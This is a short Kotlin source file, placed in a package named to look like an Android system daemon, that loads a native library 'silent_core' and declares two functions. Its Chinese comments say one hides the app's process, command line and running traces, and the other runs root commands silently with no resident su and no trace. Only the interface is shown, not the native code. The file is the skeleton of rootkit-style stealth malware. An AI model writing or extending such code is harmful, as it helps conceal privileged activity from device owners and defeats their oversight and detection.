package com.android.system.daemon

object SilentCore {
    init {
        System.loadLibrary("silent_core")
    }

    // 隐藏本APP进程、cmdline、运行痕迹
    external fun hideMe()

    // 无痕执行Root命令，无su常驻、无痕迹
    external fun execSilentSu(cmd: String): String
}
